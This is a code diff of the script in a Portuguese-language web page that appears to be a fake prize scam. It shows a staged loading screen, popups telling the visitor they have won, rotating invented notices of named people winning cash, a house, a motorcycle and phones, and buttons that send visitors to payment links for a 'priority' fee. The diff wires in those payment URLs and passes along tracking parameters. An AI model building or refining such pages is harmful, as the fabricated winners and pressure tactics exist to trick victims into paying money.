@@ -1135,240 +1135,244 @@
     <!-- Notificações -->
     <div id="notifications" class="notifications"></div>
 
-    <script>
-        console.log('🎬 Iniciando experiência cinematográfica...');
+<script>
+    console.log('🎬 Iniciando experiência cinematográfica...');
 
-        // Dados das notificações
-        const notifications = [
-            { name: 'Aline R.', prize: 'ganhou uma moto Honda Biz' },
-            { name: 'Roberto S.', prize: 'recebeu R$ 12.000 em dinheiro' },
-            { name: 'Camila V.', prize: 'foi sorteada com uma casa de 2 quartos' },
-            { name: 'Fernando L.', prize: 'ganhou uma TV 65" Samsung' },
-            { name: 'Patrícia M.', prize: 'liberou R$ 8.500 na conta' },
-            { name: 'Diego C.', prize: 'ganhou um iPhone 15 Pro Max' }
-        ];
+    // Dados das notificações
+    const notifications = [
+        { name: 'Aline R.', prize: 'ganhou uma moto Honda Biz' },
+        { name: 'Roberto S.', prize: 'recebeu R$ 12.000 em dinheiro' },
+        { name: 'Camila V.', prize: 'foi sorteada com uma casa de 2 quartos' },
+        { name: 'Fernando L.', prize: 'ganhou uma TV 65" Samsung' },
+        { name: 'Patrícia M.', prize: 'liberou R$ 8.500 na conta' },
+        { name: 'Diego C.', prize: 'ganhou um iPhone 15 Pro Max' }
+    ];
 
-        let notificationInterval;
-        let modalTimeout;
+    let notificationInterval;
+    let modalTimeout;
 
-        // Criar partículas de fundo
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const particleCount = 40;
-            
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 8 + 's';
-                particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
-                particlesContainer.appendChild(particle);
-            }
+    // Criar partículas de fundo
+    function createParticles() {
+        const particlesContainer = document.getElementById('particles');
+        const particleCount = 40;
+        
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 8 + 's';
+            particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
+            particlesContainer.appendChild(particle);
         }
+    }
 
-        // Função para simular progresso de carregamento
-        function simulateLoading() {
-            console.log('⏳ Iniciando carregamento...');
-            const progressBar = document.getElementById('progressBar');
-            const progressText = document.getElementById('progressText');
-            const loadingScreen = document.getElementById('loadingScreen');
+    // Função para simular progresso de carregamento
+    function simulateLoading() {
+        console.log('⏳ Iniciando carregamento...');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const loadingScreen = document.getElementById('loadingScreen');
+        
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 15 + 5;
             
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 15 + 5;
-                
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    
-                    setTimeout(() => {
-                        console.log('✨ Carregamento concluído - iniciando fadeout');
-                        loadingScreen.classList.add('fade-out');
-                        
-                        setTimeout(() => {
-                            loadingScreen.style.display = 'none';
-                            showMainPage();
-                        }, 1500);
-                    }, 800);
-                }
-                
-                progressBar.style.width = progress + '%';
-                progressText.textContent = Math.floor(progress) + '%';
-            }, 120);
-        }
-
-        // Função para mostrar página principal
-        function showMainPage() {
-            console.log('🎭 Revelando página principal...');
-            const mainPage = document.getElementById('mainPage');
-            if (mainPage) {
-                mainPage.classList.add('show');
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
                 
                 setTimeout(() => {
-                    console.log('💳 Mostrando popup de pagamento...');
-                    showPopup('paymentPopup', 2000);
+                    console.log('✨ Carregamento concluído - iniciando fadeout');
+                    loadingScreen.classList.add('fade-out');
                     
                     setTimeout(() => {
-                        console.log('🏆 Mostrando popup de vitória...');
-                        showPopup('winnerPopup', 2500);
-                        
-                        setTimeout(() => {
-                            startNotifications();
-                        }, 2500);
-                    }, 2000);
-                }, 500);
+                        loadingScreen.style.display = 'none';
+                        showMainPage();
+                    }, 1500);
+                }, 800);
             }
-        }
-
-        // Função para mostrar popup
-        function showPopup(popupId, duration) {
-            console.log(`🎪 Exibindo popup: ${popupId}`);
-            const popup = document.getElementById(popupId);
-            if (popup) {
-                popup.style.display = 'flex';
-                setTimeout(() => {
-                    popup.style.display = 'none';
-                    console.log(`✅ Popup ${popupId} finalizado`);
-                }, duration);
-            }
-        }
-
-        // Função para mostrar notificação
-        function showNotification(data) {
-            const container = document.getElementById('notifications');
-            const notification = document.createElement('div');
-            notification.className = 'notification';
-            notification.innerHTML = `
-                <div class="notification-name">${data.name}</div>
-                <div class="notification-prize">${data.prize}</div>
-            `;
             
-            container.appendChild(notification);
+            progressBar.style.width = progress + '%';
+            progressText.textContent = Math.floor(progress) + '%';
+        }, 120);
+    }
+
+    // Função para mostrar página principal
+    function showMainPage() {
+        console.log('🎭 Revelando página principal...');
+        const mainPage = document.getElementById('mainPage');
+        if (mainPage) {
+            mainPage.classList.add('show');
             
             setTimeout(() => {
-                if (notification.parentNode) {
-                    notification.style.transform = 'translateX(100%) scale(0.8)';
-                    notification.style.opacity = '0';
-                    setTimeout(() => notification.remove(), 300);
+                console.log('💳 Mostrando popup de pagamento...');
+                showPopup('paymentPopup', 2000);
+                
+                setTimeout(() => {
+                    console.log('🏆 Mostrando popup de vitória...');
+                    showPopup('winnerPopup', 2500);
+                    
+                    setTimeout(() => {
+                        startNotifications();
+                    }, 2500);
+                }, 2000);
+            }, 500);
+        }
+    }
+
+    // Função para mostrar popup
+    function showPopup(popupId, duration) {
+        console.log(`🎪 Exibindo popup: ${popupId}`);
+        const popup = document.getElementById(popupId);
+        if (popup) {
+            popup.style.display = 'flex';
+            setTimeout(() => {
+                popup.style.display = 'none';
+                console.log(`✅ Popup ${popupId} finalizado`);
+            }, duration);
+        }
+    }
+
+    // Função para mostrar notificação
+    function showNotification(data) {
+        const container = document.getElementById('notifications');
+        const notification = document.createElement('div');
+        notification.className = 'notification';
+        notification.innerHTML = `
+            <div class="notification-name">${data.name}</div>
+            <div class="notification-prize">${data.prize}</div>
+        `;
+        
+        container.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.style.transform = 'translateX(100%) scale(0.8)';
+                notification.style.opacity = '0';
+                setTimeout(() => notification.remove(), 300);
+            }
+        }, 3500);
+    }
+
+    // Função para iniciar notificações
+    function startNotifications() {
+        console.log('📢 Iniciando sistema de notificações...');
+        let index = 0;
+        
+        notificationInterval = setInterval(() => {
+            if (index >= notifications.length) index = 0;
+            showNotification(notifications[index]);
+            index++;
+        }, 4500);
+    }
+
+    // Função para mostrar modal
+    function showModal() {
+        console.log('🎯 Revelando modal de prioridade...');
+        const modal = document.getElementById('priorityModal');
+        if (modal) {
+            modal.style.display = 'flex';
+        }
+    }
+
+    // Função para esconder modal
+    function hideModal() {
+        console.log('❌ Fechando modal...');
+        const modal = document.getElementById('priorityModal');
+        if (modal) {
+            modal.style.display = 'none';
+        }
+        
+        const fallback = document.getElementById('fallbackSection');
+        if (fallback) {
+            fallback.style.display = 'block';
+            setTimeout(() => {
+                fallback.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 100);
+        }
+    }
+
+    // Função para ir para página de processamento
+    function goToProcessing() {
+        console.log('⚙️ Iniciando processamento...');
+        
+        const mainPage = document.getElementById('mainPage');
+        const processingPage = document.getElementById('processingPage');
+        
+        if (mainPage) {
+            mainPage.style.opacity = '0';
+            mainPage.style.transform = 'translateY(-30px)';
+            setTimeout(() => {
+                mainPage.style.display = 'none';
+                if (processingPage) {
+                    processingPage.style.display = 'block';
+                    setTimeout(() => {
+                        processingPage.classList.add('show');
+                    }, 100);
                 }
-            }, 3500);
+            }, 500);
         }
+        
+        startNotifications();
+        modalTimeout = setTimeout(showModal, 8000);
+    }
 
-        // Função para iniciar notificações
-        function startNotifications() {
-            console.log('📢 Iniciando sistema de notificações...');
-            let index = 0;
-            
-            notificationInterval = setInterval(() => {
-                if (index >= notifications.length) index = 0;
-                showNotification(notifications[index]);
-                index++;
-            }, 4500);
+    // Event Listeners
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('🚀 DOM carregado - iniciando experiência...');
+        
+        createParticles();
+        
+        const claimButton = document.getElementById('claimButton');
+        if (claimButton) {
+            claimButton.addEventListener('click', function(e) {
+                console.log('🎯 Botão resgatar clicado!');
+                goToProcessing();
+            });
         }
-
-        // Função para mostrar modal
-        function showModal() {
-            console.log('🎯 Revelando modal de prioridade...');
-            const modal = document.getElementById('priorityModal');
-            if (modal) {
-                modal.style.display = 'flex';
-            }
+        
+        const priorityButton = document.getElementById('priorityButton');
+        if (priorityButton) {
+            priorityButton.addEventListener('click', function(e) {
+                console.log('⚡ Botão prioridade clicado!');
+                // LINHA MODIFICADA - Adicione sua URL aqui
+                // O código abaixo adiciona os parâmetros da URL atual ao link
+                const priorityUrl = 'https://pay.ultimo-passo.space/BNjzgPl16PRgM78'; // <-- COLOQUE O LINK DE PRIORIDADE AQUI
+                window.open(priorityUrl + window.location.search, '_blank');
+            });
         }
-
-        // Função para esconder modal
-        function hideModal() {
-            console.log('❌ Fechando modal...');
-            const modal = document.getElementById('priorityModal');
-            if (modal) {
-                modal.style.display = 'none';
-            }
-            
-            const fallback = document.getElementById('fallbackSection');
-            if (fallback) {
-                fallback.style.display = 'block';
-                setTimeout(() => {
-                    fallback.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }, 100);
-            }
+        
+        const fallbackButton = document.getElementById('fallbackButton');
+        if (fallbackButton) {
+            fallbackButton.addEventListener('click', function(e) {
+                console.log('🔄 Botão fallback clicado!');
+                // LINHA MODIFICADA - Adiciona os parâmetros da URL atual ao link
+                window.open('https://pay.ultimo-passo.space/q510ZOb00e43E9D' + window.location.search, '_blank');
+            });
         }
-
-        // Função para ir para página de processamento
-        function goToProcessing() {
-            console.log('⚙️ Iniciando processamento...');
-            
-            const mainPage = document.getElementById('mainPage');
-            const processingPage = document.getElementById('processingPage');
-            
-            if (mainPage) {
-                mainPage.style.opacity = '0';
-                mainPage.style.transform = 'translateY(-30px)';
-                setTimeout(() => {
-                    mainPage.style.display = 'none';
-                    if (processingPage) {
-                        processingPage.style.display = 'block';
-                        setTimeout(() => {
-                            processingPage.classList.add('show');
-                        }, 100);
-                    }
-                }, 500);
-            }
-            
-            startNotifications();
-            modalTimeout = setTimeout(showModal, 8000);
+        
+        const modalClose = document.getElementById('modalClose');
+        if (modalClose) {
+            modalClose.addEventListener('click', hideModal);
         }
+        
+        const modal = document.getElementById('priorityModal');
+        if (modal) {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) hideModal();
+            });
+        }
+        
+        simulateLoading();
+        
+        console.log('✨ Experiência cinematográfica iniciada com sucesso!');
+    });
 
-        // Event Listeners
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 DOM carregado - iniciando experiência...');
-            
-            createParticles();
-            
-            const claimButton = document.getElementById('claimButton');
-            if (claimButton) {
-                claimButton.addEventListener('click', function(e) {
-                    console.log('🎯 Botão resgatar clicado!');
-                    goToProcessing();
-                });
-            }
-            
-            const priorityButton = document.getElementById('priorityButton');
-            if (priorityButton) {
-                priorityButton.addEventListener('click', function(e) {
-                    console.log('⚡ Botão prioridade clicado!');
-                    window.open('', '_blank');
-                });
-            }
-            
-            const fallbackButton = document.getElementById('fallbackButton');
-            if (fallbackButton) {
-                fallbackButton.addEventListener('click', function(e) {
-                    console.log('🔄 Botão fallback clicado!');
-                    window.open('https://pay.ultimo-passo.space/q510ZOb00e43E9D', '_blank');
-                });
-            }
-            
-            const modalClose = document.getElementById('modalClose');
-            if (modalClose) {
-                modalClose.addEventListener('click', hideModal);
-            }
-            
-            const modal = document.getElementById('priorityModal');
-            if (modal) {
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) hideModal();
-                });
-            }
-            
-            simulateLoading();
-            
-            console.log('✨ Experiência cinematográfica iniciada com sucesso!');
-        });
-
-        // Cleanup
-        window.addEventListener('beforeunload', () => {
-            if (notificationInterval) clearInterval(notificationInterval);
-            if (modalTimeout) clearTimeout(modalTimeout);
-        });
-    </script>
+    // Cleanup
+    window.addEventListener('beforeunload', () => {
+        if (notificationInterval) clearInterval(notificationInterval);
+        if (modalTimeout) clearTimeout(modalTimeout);
+    });
+</script>
 
 </body></html>
